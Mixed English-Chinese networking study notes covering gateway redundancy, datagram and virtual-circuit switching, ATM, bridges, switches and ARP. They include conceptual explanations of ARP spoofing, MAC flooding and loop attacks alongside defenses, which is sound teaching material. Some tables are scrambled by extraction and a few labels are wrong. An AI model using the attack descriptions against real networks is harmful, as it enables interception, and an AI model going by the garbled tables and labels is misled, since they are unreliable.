◦ gateway load balancing protocol GLBP 网关负载均衡协议
▸ GLBP既能备份网关又能均衡负载(充分利用资源)。
▸ 它们是工作在接入层与汇聚层(交换与路由)之间的网关路由器或多层
交换机上的网关协议。 ▸ 底层知识: · 一个网段一个子网(即使某一主类网没划分子网，可以看成是一子网网 段)。
· 一般一个子网内有以下设备:若干个主机，二层交换机，网关(分层 的，switch连接主机和网关)。
· 可以看出，一个子网网络属于交换层，在子网中流量是通过mac地址来 “寻路”的(子网内的主机之间通讯前通过发送arp广播来获取对方mac)，其 中switch帮助转发流量。
· 当主机想要与子网外的PC或服务器通讯，它不需要知道对方的mac，只 要知道该子网的网关mac(由ARP获得)就行，将信息流量发给网关，剩下 的事情交给网关解决就行(路由到其他子网)。
· 所以一台主机刚开始需要知道自身ip地址, 对方电脑ip地址, 网关ip地址 三个基本信息才能正常通讯。
· 理想化的情况: 子网中有一台router充当网关，它的一个接口的ip充当网 关ip。
· 为了防止单点故障，子网中又添加了几个备用网关(处于闲置状态)。 为了使故障发生后其中一个备用网关能够自动切换成主用(活跃)网关，才 诞生了这两个网关冗余协议。
◦ 因为站在子网内的主机的⻆度，子网内只能存在一个网关，不然流量就 不知道该发向哪一个网关了(不知为什么，交换层不能自动负载均衡，必须 选出唯一的路径，而路由表中只要AD和metric相同就会出现负载均衡)(优 先级相同就比较接口ip)。
◦ 所以这个冗余机制的基本思想是:
▸ 将多个路由器组合成一个虚拟网关(一个备份组):虚拟ip和一个虚拟 mac。
▸ 子网内的主机们只知道有一个(虚拟)网关的存在，并不知情真实网关 的情况。
▸ 而所有通往子网外的流量只经过这个组中的某一个路由器(竞选选 出)。
▸ 其余备份网关处于不工作状态但一直监听active/master的工作状态，在
必要时刻替代它的⻆色。
◦ Common Address Redundancy Protocol (CARP):
▸ HSRP is a Cisco proprietary solution.
▸ CARP is an open standard variation of HSRP. - Other Switch Features
- Switch features vary widely by manufacturer, offer a variety of security features:
- traffic filtering:
◦ MAC filtering
▸ allows traffic to be permitted or denied based on a device’s MAC address.
◦ based on criteria such as IP address information (for multilayer switches).
- monitoring and troubleshooting purposes:
◦ interface diagnostics might be accessible:
▸ This diagnostic information might contain information including various error conditions
▸ (example, late collisions or CRC errors, which might indicate a duplex mismatch).
- ◦ •
Define Key Terms
- Ethernet, collision,
- carrier sense multiple access collision detect (CSMA/CD), full-duplex, half-duplex,
- virtual LAN (VLAN), trunk,
- Spanning Tree Protocol (STP), root port, designated port, non- designated port,
- link aggregation,
- Power over Ethernet (PoE),
- supplicant, authenticator, authentication server Fortunately, some
virtual servers allow you to still have Layer 2 control (example, VLAN separation
Basic Network Devices
Networks: connect computing devices together so that users can share resources.
Some switches also support quality of service (QoS) settings: forward traffic based on the traffic’s priority markings.
Also, some switches have the ability to perform marking and remarking of traffic priority values. Any device with an IP address is a host (clients / nodes)
Switch: connect hosts togetherwithin a network.
Router: connect multiple networks together to create larger and larger networks.
Unicast: One-to-one traffic. One host sends traffic to another host, using a destination IP address.
  - The host with the destination IP address will process the packet.
  - Most other hosts will see the packet, but because it isn’t addressed to
them, they will not process it.
Broadcast. One-to-all traffic. One host sends traffic to all other hosts on the subnet, using a broadcast address such as 255.255.255.255.
  - Every host that receives broadcast traffic will process it.
  - Switches pass broadcast traffic by ports
  - routers do not pass broadcast traffic.
Switching and Forwarding
How does the switch decide output port?
check the header of the packet for an identifier that it uses to make
the decision
Two common approaches:
Datagram, Connectionless approach (common) 電路交換網路 Virtual circuit, Connection-oriented approach (common) 虛擬電
路
source routing (less common) Datagrams 自带寻址信息的,独立地从数据源行走到终点的数据
包
Every packet contains complete destination address for switch to get to destination
  - switch consults a forwarding table/routing table.
Characteristics of Connectionless/Datagram Network:
Host can send packet anywhere at any time, any packet that turns up
can be immediately forwarded (assuming a correctly populated
forwarding table)
host just sends packet, do not know if the network is capable of
delivering it or if the destination host is even up or running Each packet is forwarded independently of previous packets (may
have same destination). packets from host A to host B may have
different paths
A switch or link failure will not have serious effect on communication if it is possible to find an alternate route around the failure, and update the forwarding table accordingly
資料封包網路(datagram network)中，每當終端系統想要送出封包時，就會在 封包上標記目的終端系統的位址，然後將封包送入網路。
假設router有四條連結，0~3，封包會用下面方式被轉送給連結介面: 2,238

目的端位址範圍 連結介面
11001000 00010111 00010000 00000000 到0
11001000 00010111 00010111 11111111 11001000 00010111 00011000 00000000
到1 11001000 00010111 00011000 11111111
11001000 00010111 00011001 00000000 到2
11001000 00010111 00011111 11111111
其它 3
Router會將封包目的端位址的前置碼(prefix)與表中項目進行比對，如果找到 相符的項目，路由器便會將該封包轉送給其對應的連結。如下
前置代碼對應 連結介面
11001000 00010111 00010 0 11001000 00010111 00011000 1 11001000 00010111 00011 2
其它 3 假設封包的目的端位址為11001000 00010111 00010110 10100001，因此位址 前置的21位元與表中的第一項目相符，所以router會將該封包轉送給介面0。 如果沒有位址的前置碼相符於前三筆項目中的任一筆，則router會將封轉送給 介面3。
當有多筆相符的項目時，router會採用最⻑前置碼相符原則(longest prefix matching rule)，它會找到表中最⻑的相符項目，然後將封包轉送給最⻑前置 碼相符項目所對應的連結介面。
Virtual Circuit Switching
■ Widely used technique, Uses the concept of virtual circuit (VC)
Also called connection-oriented model 面向连接
一條VC(virtual circuit)包括:來源主機到目的主機的路徑、VC編號、路徑上所
有router的轉送表項目。 Two-stage process:
  - First set up virtual connection between source and destination host.   - then send data.
  - Terminaet the VC.
Connection setup
Establish connection state in all switches between source and destination hosts.
  - Connection state: consists of an entry in the VC table in each switch.
  - Each entry in the VC table on single switch contains:
  - A virtual circuit identifier (VCI): uniquely identifies
the connection at this switch, will be carried in the
header of the packets of this connection.
  - An incoming interface for this VC arrive at the
switch
  - An outgoing interface for this VC leave the switch   - A potentially different VCI: used for outgoing
packets
  - If packet arrives on the designated incoming interface,
contains the designated VCI value in its header.
  - then the packet should be sent out the specified outgoing
interface with the specified outgoing VCI value first having been placed in its header
Importante:
The VCI value of the packets received + interface on which
they are received uniquely identifies the virtual
connection.
There may be many virtual connections established in the switch at one time
Incoming, outgoing VCI values are not generally the same VCI value is not a globally significant identifier for
connection
It has significance only on a given link
When new connection is created, need to assign a new VCI value for that connection on each passed link, in same link, diffrent connection need different VCI value.
Two approach to establishing connection state
■ Network Administrator configure the state ■ The virtual circuit is Permanent Virtual Circuit(PVC)
■ The network administrator can delete this
■ Can be thought of as a long-lived or administratively configured VC
■ A host send messages to the network to cause the state to be established
This is referred as signalling and the resulting virtual circuit is said to be Switched Virtual Circuit(SVC) / signalled VC
A host may set up/delete VC dynamically without administrator
In real networks, configuring VC tables correctly in large number of switches would quickly become excessive
Thus, some sort of network managgement tool or signalling is almost always used, even when setting up “permanent” VCs
PVCs, signalling is initiated by the network administrator SVCs, usually set up using signalling by one of the hosts
Network Administrator configure the state
■ First the administrator identifies a path through the network from A to B
■ The administrator picks VCI value for each link for the connection
■ VCI value 5 is chosen for the link from host A to switch 1 ■ VCI value11 is chosen for the link from switch 1 to switch 2
■ VCI value 7 is chosen for link from switch 2 to switch 3 VCI value 4 is chosen for the link from switch 3 to host B  Switchs are configured, have following entry in VC table
2 5 1 11
3 11 2 7
0714
For packet A send to B:
  - A puts the VCI value 5 in the header of packet and sends it to switch 1
  Switch 1
Incoming Interfa
ce
     Incoming VC
     Outgoing Interface
    Outgoing VC
       Switch 2
Incoming Interfa
ce
     Incoming VC
     Outgoing Interface
    Outgoing VC
       Switch 3
Incoming Interfa
ce
     Incoming VC
     Outgoing Interface
    Outgoing VC
     Switch 1 receives packet on interface 2,
  - It combine the interface and VCI in the packet header, find the VC table entry.
  - Switch 1 table entry: forward the packet out of interface 1, put the VCI value 11 in the header.
Packet will arrive at switch 2 on interface 3 bearing VCI 11
  - Switch 2 looks up interface 3 and VCI 11 in its VC table
  - sends the packet on to switch 3 after updating the VCI value appropriately
This process continues until it arrives at host B with the VCI value 4 in the packet
To host B, this identifies the packet as having come from host A
How does the signalling work
“When packets arrive on port 2 with identifier 5, send them out on port 1”
 Set up:
To start the signalling, host A sends a setup message into the network (to switch 1)
  - The setup message contains (among other things) the complete destination address of B.   - It is like sending a datagram to B
  - Every switch have to knows which output to send the
setup message so that it eventually reaches B
  - Assume that every switch knows the topology to figure out how
to do that
When switch 1 receives the connection request
  - it send it to switch 2,
  - it creates a new entry in its VC table for this new connection
  - Exactly like the entry in PVC, just the port assign the VCI
  - Switch 1 picks value 5 for this income VCI.
When switch 2 receives, picks the value 11 as the incoming VCI switch 3 picks value 7 for its incoming VCI
  - can pick any number it likes, as long as that number is not currently in use for some other connection on that port of this switch
Finally the setup message arrives at host B.
When B is healthy and willing to accept a connection from host A, it
allocates an incoming VCI value 4.
  - This VCI value can be used by B to identify all packets coming
from A
To complete the connection, everyone needs to be told what their downstream neighbor is using as the VCI for this connection
Host B:
  - sends an acknowledgement of the connection setup to
switch 3
  - includes in that message the VCI value 4. Switch 3:
  - completes the VC table entry for this connection
  - sends the acknowledgement to switch 2 specifying the
VCI 7
Switch 2:
  - completes the VC table entry for this connection
  - sends acknowledgement to switch 1 specifying the VCI
11 Finally switch 1:
  - passes the acknowledgement to host A
  - telling it to use the VCI value 5 for this connection.
Host A has a firm acknowledgement that everthing is in place all the way to host B.
Tears down:
When host A no longer wants to send data to host B, it tears down the connection by sending a teardown message to switch 1
The switch 1:
  - removes the relevant entry from its table,
  - forwards the message on to the other switches in the path which similarly delete the appropriate table entries
At this point, if host A were to send a packet with a VCI of 5 to switch 1, it would be dropped as if the connection had never existed
Characteristics of VC
host A has to wait for the connection request to reach the far side of the network and return before it can send its first data packet,
at least one RTT delay before data is sent
While the connection request contains the full address for host B
(which might be quite large, being a global identifier on the network), each data packet contains only a small identifier, which is only unique on one link.
■ Thus the per-packet overhead caused by the header is reduced relative to the datagram model
If a switch or a link in a connection fails
the connection is broken, a new one will need to be established.
the old one needs to be torn down, free up table storage space in switches
The issue of how a switch decides which link to forward the connection request on has similarities with the function of a routing algorithm
■ Good Properties of VC
By the time the host gets the go-ahead to send data, it knows quite a
lot about the network:
Example,
  - there is really a route to the receiver and that the
receiver is willing to receive data To allocate resources to the virtual circuit at the time it is established example, an X.25 network – a packet-switched network that
uses the connection-oriented model – employs the following three-part strategy
  - Buffers are allocated to each virtual circuit when the circuit is initialized
  - The sliding window protocol is run between each pair of nodes along the virtual circuit, to prevent overrun the buffers allocated at the receiving node.
  - The circuit is rejected by a given node if not enough buffers are available at that node when the connection request message is processed
Ensured of having the buffers it needs, this basic strategy is called
hop-by-hop flow control.
Contention
Contention: occurs when multiple packets have to be queued at a switch because they are competing for the same output link.
How to deal with congestion is related to whether network uses VC or datagrams. VC (X.25 network): each switch allocates enough buffers to handle the packets.
  - In this case, the network has defined away the problem of congestion
  - Switch never encounters a situation in which it has more packets to queue than it has buffer space, it does not allow the connection to be established unless it can dedicate enough resources to it to avoid this situation.
  - But extremely conservative, the switch is potentially underutilized. datagram model: seemingly invites congestion
  - do not know that there is enough contention at a switch to cause congestion until you run out of buffers.
  - But, it is too late to prevent the congestion, can only try to recover from it.   - You may be able to get better utilization out of your switches since you are not holding buffers.
Not strictly black and white
VC Comparison with the Datagram Model
Datagram network:
  - no connection establishment phase,
  - each switch processes each packet independently
  - Each arriving packet competes with all other packets for buffer
space
  - If there are no buffers, the incoming packet must be dropped
In VC:
  - VC 与 datagrams 類似，必須先建立一條電路通道，但是最大 不同在於，VC 在建立電路通道時，只佔用路徑頻寬的一部分， 剩餘頻寬部分，仍可提供給其他使用者來使用，並非像電路交換 網路是完全佔用通道的。
  - 1. 選擇路徑的工作很佔時間，因此若要傳送大量資料，最 好用Virtual circuit。
  - Datagram:封包傳遞路徑並非唯一，因此所經過的 各個節點都必須執行傳送路徑選擇的工作。
  - Virtual circuit:事先就建立好傳送的路徑，因此，各 個節點不必都執行路徑選擇的工作。
  - 2. 可靠性，若網路上每個節點突然故障:
  - Datagram由逾期傳送路徑不是唯一的，可以另外找
路徑來傳送資料，
  - Virtual circuit則因路徑是固定的，可能較易受到影響
而無法正常傳送資料。
  - providing each circuit with a different quality of service (QoS)
  - Example:
  - Switchs might allocate a percentage of each outgoing link’s bandwidth to that circuit
  - Delay tolerance on each switch: ensure that packet belonging to a partivular circuit not be delayed/queued for for than a certain amount of time. Most popular examples of VC technologies are Frame Relay and ATM Most commom now aday: the construction of VPN
 Assumptions
Each host has a globally unique address
There is some way to identify the input and output ports of each
switch
Numbers or names
ATM (Asynchronous Transfer Mode)
Virtual circuit, Connection-oriented packet-switched network Packets are called cells
  - 5 byte header + 48 byte payload
Fixed length packets are easier to switch in hardware
  - Simpler to design ▪


##   - Enables parallelism 平行 ATM
User-Network Interface (UNI)
Host-to-switch format
GFC: Generic Flow Control
VCI: Virtual Circuit Identifier
Type: management, congestion control CLP: Cell Loss Priority
HEC: Header Error Check (CRC-8)
Network-Network Interface (NNI)
■ Switch-to-switch format
■ GFC becomes part of VPI field
Source Routing
All the information about network topology that is required to switch a packet across the network is provided by the source host.
 ▪


##   Other approaches in Source Routing
 Hubs / bit spitter
(2 side 1 collision domain / 1 broadcast) Layer 1
hub (specifically, an Ethernet hub in this discussion)
hub does not make forwarding decisions
receives bits in on one port, retransmits bits out all other ports except the
port on which the bits were received.
Hubs most often use UTP cabling to connect to other network devices; however, some early versions of Ethernet hubs supported fiber-optic
connections.
3 basic types of Ethernet hubs exist:
  - Passive hub: Does not amplify/electrically regenerate the received bits.
  - Active hub: Regenerates incoming bits to all the ports on a hub except the income port.
  - Smart hub: an active hub with enhanced features, like Simple Network Management Protocol (SNMP) support.
downside:
  - all ports on a hub is same collision domain.
  - the inefficient use of bandwidth (bits sent to all ports except the
port received), hubs are rarely seen in modern LANs.
  - limit scalability of hub-based LANs.
  - All devices on a hub belong to the same broadcast domain, a
broadcast sent into the hub will be propagated out all of the ports on the hub (all ports except the port received).
 Bridges and LAN Switches
Bridges and LAN Switches
Class of switches that is used to forward packets between shared- media LANs such as Ethernets ■ Known as LAN switches
■ Referred to as Bridges
Suppose you have a pair of Ethernets that you want to interconnect
■ One approach is put a repeater in between them
■ It might exceed the physical limitation of the Ethernet
■ No more than four repeaters between any pair of hosts
■ No more than a total of 2500 m in length is allowed
■ An alternative would be to put a node between the two Ethernets and have the node forward frames from one Ethernet to the other
■ This node is called a Bridge
■ A collection of LANs connected by one or more bridges
is usually said to form an Extended LAN Bridges (2 side 2 collision domains / 1 broadcast every port)
Layer 2
Router: directs network traffic based on the destination IP address.
Switch: directs traffic to specific ports based on the destination MAC address. Bridge: directstrafficbasedonthedestinationMACaddress.  Subnet C has 2 segments separated by a bridge. The bridge sends traffic to the appropriate segment in Subnet C based on the MAC address.
if it doesn’t know the MAC address is in Bridge Segment 1 or Bridge Segment 2, it sends the traffic to both bridge networks.
When Lisa’s computer replies, the bridge identifies her MAC address as being in Bridge Network 1 and stores this information in an internal table.
When other traffic to Lisa, the bridge forwards it to Bridge Segment 1 only.
A hardware bridge using this learning method is relatively easy to install.
Connect the wires, turn it on, and it will begin learning.
when have a pair of Ethernets that want to interconnect
  - put a repeater in between them
  - It might exceed the physical limitation of the Ethernet
  - No more than 4 repeaters between any pair of hosts
  - No more than a total of 2500 m in length is allowed   - put a Bridge between the two Ethernets and have the bridge forward frames for 2 Ethernets.
  - A collection of LANs connected by bridges is said to form an Extended LAN.
Simplest Strategy for Bridges
■ Accept LAN frames on their inputs and forward them out to all other outputs
■ Used by early bridges. Learning Bridges
Observe that there is no need to forward all the frames that a bridge receives
Bridge joins together 2 or more LAN segments, typically 2 Ethernet LAN segments.
Each LAN segment is in separate collision domains
As a result, an Ethernet bridge can be used to scale Ethernet networks to a larger number of attached devices.
makes intelligent forwarding decisions based on the destination MAC address present in a frame.
analyzes source MAC address information on entering frames, and populates an internal MAC address table based on the learned information.
Intelligently forward the frame out the appropriate port.
switch on hardware level, bridge on software level.
Learn the Mac address:
all ports on a bridge 1 broadcast domain.
  - At Layer 2, the destination MAC address of a broadcast frame is FFFF.FFFF.FFFF in hexadecimal notation.
  - a bridge filters frames (sends frames only out necessary ports) if the bridge has previously learned the destination MAC address in its MAC address table.
  - no device will have MAC address of FFFF.FFFF.FFFF,
  - a bridge will never enter that MAC address in its MAC address table.
  - broadcast frames are flooded out all bridge ports other than the port
which received the frame.
bridges have largely been replaced with switches.
  - a bridge makes its forwarding decisions in software
  - a switch makes its forwarding decisions in hardware, using switches, they enable switches to offer a variety of switch features, including VLANs, trunks, port mirroring, Power over Ethernet (PoE), and 802.1x authentication.
 Bridge can learn information by itself.
Each bridge inspects the source address in all the frames it receives.
■ Record the information at the bridge and build the table.
■ When a bridge first boots, this table is empty, Entries are added over time.
■ A timeout is associated with each entry.
■ The bridge discards the entry after a specified period of time
■ To protect against the situation in which a host is moved from one network to another
If the bridge receives a frame that is addressed to host not currently in the table
Forward the frame out on all other ports
Strategy works fine if the extended LAN does not have a loop in it. How does an extended LAN come to have a loop in it? ■ Network is managed by more than one administrator
■ example, it spans multiple departments in an organization
■ It is possible that no single person knows the entire configuration of the network
■ A bridge that closes a loop might be added without anyone knowing
■ Loops are built into the network to provide redundancy in case of failures
 Solution ▪


## Switches
(each port 1 collision domain, 1 broadcast ) Layer 2
Like a bridge, switch can dynamically learn the MAC addresses attached to various ports by looking at the source MAC address on frames coming into a port.
When devices are first connected to an Ethernet switch, it send out frames to all connected machines (like hub).
Over time, switch learns the addresses of the machines that are connected to its various ports.
   ▪


##   - Identify prots: name it with number or name of the node.
if a frame is designated to broadcast to all the machines on a network segment, a switch will send that frame out to all its connected machines(like hub).
switching and forwarding: A switch’s primary job, receive incoming packets on 1 link and to transmit them on some other links.
  - According to OSI architecture, this is the main function of the network layer
Security Benefit
Reduces collisions.
increases the effective speed of the network, effective bandwidth.
  - If not every one use the same time, Every host on a switched network has its own link to the switch, it possible for hosts to transmit at the full link speed (bandwidth) provided that the switch is designed with enough aggregate capacity.
Reduces eavesdropping:
  - less likely to be seen by not destination machines.
  - If an attacker installed a protocol analyzer on a computer attached to a port, it would not capture unicast traffic going through the switch to the other ports.
  - In contrast, if the computers were connected with a simple hub, the attacker could capture it because unicast traffic goes to all ports on a hub.
  - the main security reason why organizations replace hubs with switches.
     ▪


##   - The switch reduces the risk of an attacker capturing data with a protocol analyzer.
providing high aggregate throughput More scalable.
example:
switch port 1 received a frame with source MAC address DDDD. DDDD.DDDD.
Switch conclude that MAC address DDDD.DDDD. DDDD resided off of port 1.
  - if the switch received a frame destined for DDDD.DDDD.DDDD,
  - the switch only send that frame out of port 1
when a switch receives a frame destined for a MAC address not yet in the
switch’s MAC address table.
The switch floods that frame out of all of the switch ports, except the port on which the frame was received.
broadcast frames:
flooded out all switch ports (except the port on which the frame was received)
because no endpoint will have the broadcast frames's MAC address, broadcast frames's MAC address will never be learned by switch’s MAC
address table.
How a switch’s MAC address table becomes populated:
consider PC1 that wants to form a Telnet connection with a server. assume that PC1 and its server both reside on the same subnet
(no routing is required between PC1 and its server).
To properly form a Telnet segment, PC1 needs to know:
  - PC1 MAC address: AAAA.AAAA.AAAA
  - Server's IP address (Layer 3 address): Get via Domain Name System
             (DNS).
  - PC1 does not have the server’s MAC address in its ARP cache.
  - send an address resolution protocol (ARP) request (broadcast
frame) to learn the server’s MAC address.
  - destination MAC address is FFFF.FFFF. FFFF.
  - Server's MAC address (Layer 2 address): SW1:
  - SW1 get PC1’s ARP request enter from port Gig 0/1
  - PC1’s MAC address is added to SW1’s MAC address table.
  - the MAC address of server is not known to SW1’s MAC address
table,
  - SW1 floods a copy of the incoming frame out all switch ports
SW2:
  - SW2 get the ARP request over its Gig 0/1 trunk port,
  - the MAC address of server is not known to SW1’s MAC address
table,
  - SW2 floods the broadcast.
  - The server receives the ARP request and responds with an ARP reply.
  - (not a broadcast frame)
  - The ARP reply has destination of PC1 MAC address.
  - the server’s MAC address of BBBB.BBBB.BBBB is added to SW2’s
MAC address table.
SW2 sent out the ARP reply to port Gig 0/1 to SW1.
SW1 forwards the ARP reply out port Gig 0/1 to the endpoint of PC1.
  - PC1 receiving the ARP reply in its Gig 0/2 port,
  - the server’s MAC address of BBBB.BBBB.BBBB is added to SW1’s
MAC address table.
PC1 now knows the MAC address of the server.
SW1 has the server’s MAC address in its MAC address table.
PC1 can now send a properly construct a Telnet segment destined for the server.
SW1 receives the Telnet segment from PC1, forwarded out of SW1’s Gig 0/2 port.
▸ SW2 forwards the Telnet segment out of its Gig 0/2 port.
▸ SW2 has an entry for the segment’s destination MAC address in its MAC address table.
After learned the MAC address as a result of its earlier ARP request and stored that result in its local ARP cache, the transmission does not require additional ARP requests.
unused for a period of time, entries in a PC’s ARP cache can timeout. PC would have to broadcast another ARP frame.
The sending of the additional ARP adds a small amount of delay when
reestablishing a session with that destination IP address.
Multilayer Switches
(each port 1 collision domain, 1 broadcast)
switch makes decisions based on MAC address.
Multilayer switch can make forwarding decisions based on upper-layer
information.
  - more accurate, can make decisions based on destination IP address
information like router.
  - Then can be used to interconnect not just network segments, but entire
networks.
  - For traffic to travel between 2 networked devices that belong to
different networks, that traffic must be routed (make decision
based on Layer 3 information).
All ports on a Layer 2 switch same broadcast domain
  - But if configured as such, all ports can belong to different broadcast domains.
 Aggregation Switch
connects multiple switches together in a network.
If you replace the bridge with a switch, the switch is an aggregation switch.
 reduces the number of ports used in the router.
It’s common to place an aggregation switch in the same location as you’d place
routers.
  - Example, large organizations locate network devices in the data center
while smaller organizations locate them in a wiring closet.
  - Both are secured using physical security. ▪


## ARP address resolution protocol (ARP)
 ARP作用: 地址解析，根据IP地址获取对应的mac地址。 引入ARP缓存: 将ip和mac的映射保存在本地，防止每次发送ip数据 包之前都要进行一次arp解析。
Data link-layer protocol provides services to the network
layer
  - connects 2 layers, resolve IP addresses to MAC
addresses
  - find host’s hardware/MAC address with its network layer/IP address.
  - a man-in-the-middle attack against this protocol, ARP spoofing.
 ▪


##  ARP works by broadcasting requests that queries all the
network interfaces on a local-area network, and caching responses for future use
  - broadcast message queries all the network interfaces on a LAN, so the destination can respond.
ARP request: a computer broadcasting a message of the
form
  - who has <IP1> tell <IP2>
  - ARP reply is transmitted in a frame addressed only to
the machine that made the ARP request.
ARP reply: When the machine with <IP1> or ARP server receives this message, its broadcasts the response
  - <IP1> is <MAC> ARP cache:
the machine stores the IP-MAC address pair locally in a table
The requestor’s IP address <IP2> is contained in the link header
displays the ARP table
ip neighbor
arp - a (check) -d (delete)
Internet Address Physical Address Type
     128.148.31.1. 00-00-0c-07-ac-00
dynamic 128.148.31.15 00-0c-76-b2-d7-1d dynamic
 $ netstat -rn
Kernel IP routing table
Destination Gateway Window irtt Iface
128.198.50.16 0.0.0.0 0 eth0
Genmask Flags MSS
10.0.5.0 eth1
10.0.7.0 eth1
10.0.0.0 eth1
10.0.3.0 eth1
10.0.9.0 eth1
10.0.11.0 eth1
10.0.12.0 0 eth1
0.0.0.0 eth0
0.0.0.0 0.0.0.0 0.0.0.0 0.0.0.0 0.0.0.0
0.0.0.0
255.255.255.0 255.255.255.0 255.255.255.0 255.255.255.0 255.255.255.0
U U U U U
10.0.0.106 128.198.50.17
UG 0.0.0.0 UG
255.255.255.248 U
0 0 00 0
00 0 00 0 00 0 00 0
0 0 0 0 0
0 0 0
255.255.255.0 255.255.254.0
U ▪


##   - arp - s IP MAC: permanently maintain or statically add an ARP entry.
  - add the string pub to the end of the command, and the system will act as an ARP server, answering ARP requests even for an IP that it does not process.
Gratuitous ARP
- A test for duplicate IP address on a LAN.
- not waiting for request just sending the reply.
IPv6 does not use ARP, it use NDP (Neighbor Discovery Protocol) similar to ARP.
  - to find a target device, IPv6 device sends a Neighbor Solicitation (NS) ICMPv6 message to a multicast address.
  - if target device receives the request, it responds with a
Neighbor Advertisement (NA) ICMPv6 message.
NDP is safer than ARP, but the ICMPv6 is sent in clear text.
ARP缓存中毒的攻击方法和效果: 因为arp缓存是无状态的，只要每次接收到arp信息就对arp缓
存进行更新 所以攻击方法就是发送一个假的arp应答报文，将arp缓存中的
ip映射到一个错误的mac地址。 效果就是使得被攻击主机无法上网。
     Physical Security of a Switch
Many switches have a console port that administrators can use to monitor all traffic. Unlike the normal ports that only see traffic specifically addressed to the port, the monitoring port will see all traffic in or out of the switch. This includes any unicast traffic the switch is internally switching between two regular ports. The monitoring port is useful for legitimate troubleshooting, but if the switch isn’t protected with physical security, it can also be useful to an attacker.
Physical security protects a switch by keeping it in a secure area such as in a locked wiring closet. Physical security ensures that attackers don’t have physical access to the switch and other network devices.
Loop Prevention
In some situations, a network can develop a switching loop or bridge loop problem. The effect is similar to a broadcast storm and it can effectively disable a switch.
example, if a user connects two ports of a switch together with a cable, it creates a switching loop where the switch continuously sends and resends unicast transmissions through the switch. In addition to disabling the switch, it also degrades performance of the overall network.
This is trivial for many network administrators, because most current switches have Spanning Tree Protocol (STP) or the newer Rapid STP (RSTP) installed and enabled for loop prevention.
However, if these protocols are disabled, the switch is susceptible to loop problems.
The simple solution: ensure switches include loop protection like STP or RSTP.
Spanning Tree Protocol also protects the network against potential attackers. example, imagine an attacker visits a conference room and has access to RJ-45
wall jacks.
If loop protection isn’t enabled, he can connect two jacks together with a cable, slowing network performance down to a crawl. Flood Attacks and Flood Guards
A MAC flood attack: attempts to overload a switch with different MAC addresses associated with each physical port. You typically have only one device connected to any physical port. During normal operation, the switch’s internal table stores the MAC address associated with this device and maps it to the port.
an attacker sends a large amount of traffic with spoofed MAC addresses to the same port.
At some point in a MAC flood attack, the switch runs out of memory to store all the MAC addresses and enters a fail-open state.
Instead of working as a switch, it begins operating as a simple hub.
Traffic sent to any port of the switch is now sent to all other switch ports.
At this point, the attacker can connect a protocol analyzer to any port and collect
all the traffic sent through the switch. Many switches include a flood guard:
When enabled, switch limit the amount of memory used to store MAC addresses for each port.
  - Example, the switch might limit the number of entries for any port to 132 entries. This is much more than you need for normal operation.
  - If the switch detects an attempt to store more than 132 entries, it raises an alert.
  - The flood guard typically sends a Simple Network Management Protocol (SNMP) trap or error message in response to the alert.
disable the port:
  - effectively blocks all traffic through the port until an administrator intervenes.
restrict updates for the port.
  - the switch will use currently logged entries for the port, but ignore attempts to update it. All other ports will continue to operate normally. number of MACs supported by a port.
  - Most ports will typically have this set to 1 to support only a single
MAC address.
  - However, consider a virtual machine (VM) running within a physical host. If the VM is set to bridged, it can access the network using the physical host’s NIC, but with the MAC address of the VM. In this scenario, the Maximum MAC setting should be set to 2.
ARP Spoofing:
The ARP protocol is simple and effective, but it lacks authentication scheme.
Any computer on the network could claim to have the requested IP address.
Any machine that receives an ARP reply, even if it was not preceded by a request, will automatically update its ARP cache with the new association.
  - Requests are not tracked
  - ARP announcements are not authenticated
  - Machines trust each other
  - According to the standard, almost all ARP implementations are
stateless
The ARP table is updated whenever an ARP response is received.
a man-in-the-middle attack against ARP protocol A rogue machine can spoof other machines
ARP spoofing attack.
For this shortcoming, it is possible for malicious parties on a LAN to perform: ARP spoofing attack.
Attacker Eve sends an ARP reply to target Alice:   - associates the IP address of the LAN gateway Bob with Eve’s MAC address.
Eve also sends an ARP reply to Bob:
  - associating Alice’s IP address with Eve’s MAC address.
After this ARP cache poisoning has taken place. establishes a man-in- the-middle scenario,
Thus, all traffic between Alice and Bob (who is the gateway to the Internet) is routed through Eve. Eve has control over the traffic between the gateway Bob and the target Alice.
Eve can choose to passively observe this traffic, allowing her to sniff passwords and other sensitive information, or she can even tamper with the traffic, altering everything that goes between Alice and Bob. A simple denial-of-service attack is also possible.
The power of ARP spoofing is derived from the lack of identity verification in the Internet’s underlying mechanisms. Needs take caution in securing the local networks.
Several means of preventing ARP spoofing:
restricting LAN access to trusted users.
One simple technique involves checking for multiple occurrences of the same MAC address on the LAN, which may be an indicator of possible ARP spoofing.
For more complex and flexible defense techniques, many software solutions inspect all ARP packets and compare their contents with stored records of ARP entries, detecting and preventing spoofing.
  - Examples: anti-arpspoof, XArp, and Arpwatch.
use static ARP tables, network administrator manually specify
router’s ARP cache to assign certain MAC addresses to specific IP addresses.
  - When using static ARP tables, ARP requests to adjust the cache are ignored, so ARP spoofing of that router is impossible.
  - inconvenience of manually add entries for each device on the network, reduces flexibility when a new device joins the network
  - but significantly mitigates the risk of ARP cache poisoning. Moreover, this solution does not prevent an attacker from spoofing a MAC address to intercept traffic intended for another host on the network.
Attacks:
ARP Poisoning:
  catch telnet password:  Poisoned ARP Caches  network DOS using ARP: arp request
 Layer 3: The Network Layer (Packets)
Examples of devices: routers and multilayer switches.
Handles Logical addressing and routing od traffic: uses logical addressing to make forwarding decisions.
- The lowest layer for protocal software.
- A variety of routed protocols (like, AppleTalk and IPX) have their own
logical addressing schemes
- the most widely deployed routed protocol is Internet Protocol (IP).
  - IP address: nonpersistent address asigned via software and changed as needed.
  - IPv4 adress: 32 bits.
  - IPv6 adress: 128 bits.
- A less popular Layer 3 protocol is Novell’s Internetwork Packet Exchange
(IPX), which has its own format for Layer 3 addressing. (Although Novell developed, most modern Novell networks use IP as their Layer 3 protocol.)
Switching:
- Not only in Layer 2, but also exists at Layer 3.
- making decisions about how data should be forwarded, 3 common switching
techniques:
- Packet switching:
  - With packet switching, a data stream is divided into packets.
  - Each packet has a Layer 3 header, which includes a source and
destination Layer 3 address.
- Circuit switching:
  - Circuit switching dynamically brings up a dedicated communication link between two parties in order for those parties to communicate.
  - Example: making a phone call from your home to a business, traditional landline servicing your phone, the telephone company’s switching equipment interconnects your home phone with the phone system of the business you’re calling. This interconnection (circuit) only exists for the duration of the phone call.
- Message switching:
  - usually not suit for real-time applications, because of the delay involved.   - a data stream is divided into messages.
  - Each message is tagged with a destination address, and the messages
travel from one network device to another network device on the way
to their destination.
  - Because these devices might briefly store the messages before
forwarding them, a network using message switching sometimes called a store-and-forward network.
